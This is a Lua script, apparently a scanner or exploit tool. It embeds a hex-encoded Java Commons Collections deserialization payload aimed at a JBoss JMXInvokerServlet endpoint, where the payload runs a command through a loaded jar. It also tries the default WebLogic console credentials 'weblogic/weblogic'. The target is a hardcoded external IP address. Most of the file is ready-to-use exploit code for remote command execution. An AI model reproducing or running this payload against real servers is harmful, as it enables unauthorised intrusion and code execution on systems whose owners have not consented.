local curl = agent.require "lcurl"

-- Convert string of a hex form like 'aced' into standard string
--
-- @param str The hex string to be converted
-- @return The standard string that converted from str
function string.fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

-- Convert string into a hex form like 'aced' 
--
-- @param str The String to be converted
-- @return The hex string that converted from str
function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

function string.charPrint(str)
    str:gsub('.', function (c)
        io.write(c)
    end)
end

--POST方式访问页面
function check_pwd(login_url, user, pwd,cookie)
    local response_html = ""
    local visitable = true
   
    --local cookie=" ADMINCONSOLESESSION=3QCWWcfWEmXMrRlUtLGKIVQuotZZWP-4iOKYhtDOqZ2V9gupNkSG!-229738787; path=/console/; HttpOnly"
    --headers = {"Cookie:"..cookie}
    headers = {"Accept: text/*",
               "Cookie: "..cookie,
               }
    PostStr=("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737200316F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E5472616E73666F726D65644D617061773FE05DF15A700300024C000E6B65795472616E73666F726D657274002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B4C001076616C75655472616E73666F726D657271007E00057870707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000067372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200176A6176612E6E65742E55524C436C6173734C6F61646572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000017672000F5B4C6A6176612E6E65742E55524C3B5251FD24C51B68CD02000078707400096765744D6574686F647571007E001900000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E00197371007E00117571007E001600000002707571007E0016000000017571007E001B000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F7269747971007E00134C000466696C6571007E00134C0004686F737471007E00134C000870726F746F636F6C71007E00134C000372656671007E00137870FFFFFFFFFFFFFFFF7074000B7574696C3233332E6A617274000074000466696C657078740006696E766F6B657571007E001900000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00167371007E00117571007E0016000000017400106A632E7574696C2E436F6D6D5574696C7400096C6F6164436C6173737571007E00190000000171007E00207371007E00117571007E0016000000027400046D61696E7571007E001900000001767200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B47020000787071007E001D7571007E00190000000271007E002071007E00217371007E00117571007E001600000002707571007E0016000000017571007E003900000004740004646174617400072D616374696F6E74000672756E636D647400126563686F2076756C7465737431313131317171007E002B7571007E00190000000271007E002E71007E002F737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C7708000000100000000174000576616C756574000D646F65732774206D617474657278787672001B6A6176612E6C616E672E616E6E6F746174696F6E2E54617267657400000000000000000000007870")
    PostStr=PostStr:fromhex()
    PostStr:charPrint()
    PostStr=PostStr:tohex()
    print("PostStr=",PostStr)
    --PostStr1="test"
    -- requester = curl.easy()
    -- requester:setopt_useragent("Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6")
    -- requester:setopt_httpheader(headers)
    -- --requester:setopt_cookiefile("")
    -- requester:setopt_followlocation(1) --允许redirection
    -- requester:setopt(curl.OPT_HEADER, true)
    -- requester:setopt(curl.OPT_URL,login_url.."/invoker/JMXInvokerServlet")
    -- requester:setopt(curl.OPT_POST, true)
    -- --requester:setopt(curl.OPT_FOLLOWLOCATION,true) --允许redirection
    -- requester:setopt(curl.OPT_POSTFIELDS,PostStr)
    -- requester:setopt(curl.OPT_WRITEFUNCTION, 
    -- function(s) 
    --     response_html = response_html..s 
    --     return true 
    -- end)
    -- requester:setopt(curl.OPT_TIMEOUT, 3)
    -- local tmp_code, tmp_msg = requester:perform()
    -- if requester:getinfo(curl.INFO_RESPONSE_CODE) == 404 then
    --     print("response_code:404")
    --     visitable = false
    -- end
    -- print(response_html)
end

--GET方式访问页面,需要先取Set-Cookie值
function AccessPage(url,cookie) 
    local response_html=""
    local cookielist={}
    local visitable = true
    local requester = curl.easy()
    headers = {"Accept: text/*",
               "Cookie: "..cookie
               }
    GetStr="?j_username=weblogic&j_password=weblogic&j_character_encoding=UTF-8"
    --requester:setopt(curl.OPT_SSL_VERIFYHOST, 0)
    --requester:setopt(curl.OPT_SSL_VERIFYPEER, 0)
    requester:setopt(curl.OPT_HTTPHEADER,headers)
    requester:setopt_cookiefile("Cookie: "..cookie)
    requester:setopt(curl.OPT_HEADER, true)
    requester:setopt(curl.OPT_FOLLOWLOCATION,true)
    requester:setopt(curl.OPT_URL, url.."/console/login/LoginForm.jsp"..GetStr)
    requester:setopt(curl.OPT_WRITEFUNCTION, function(buffer)
    response_html = response_html..buffer
    end)
    requester:setopt(curl.OPT_TIMEOUT, 3)
    local tmp_code, tmp_msg = requester:perform()
    if requester:getinfo(curl.INFO_RESPONSE_CODE) == 404 then
        visitable = false
    end
    
    cookielist=requester:getinfo(curl.INFO_COOKIELIST)
    if cookielist == nil then
        print("cookielist is nil!")
    end
   
    --print(response_html)
   for key, value in pairs(cookielist) do
        print("Cookie:",key,value)
   end
   
   --i,j=string.find(response_html,"[Set-Cookie: %S]*path=/") 
   --if i == nil  then
    --   return
    --end
    --cookie=string.sub(response_html,i+12,j-7) 
    --print ("Cookie:",cookie)
    return cookie
 
end

function main()
    print("[*]Start test.......")
    username="weblogic"
    password="weblogic"
    local cookielist={}
    url="43.224.208.193:8080"
    url="http://"..url
    cookie="test"
    --cookie=AccessPage(url,cookie)
    check_pwd(url,username,password,cookie)
end

main()
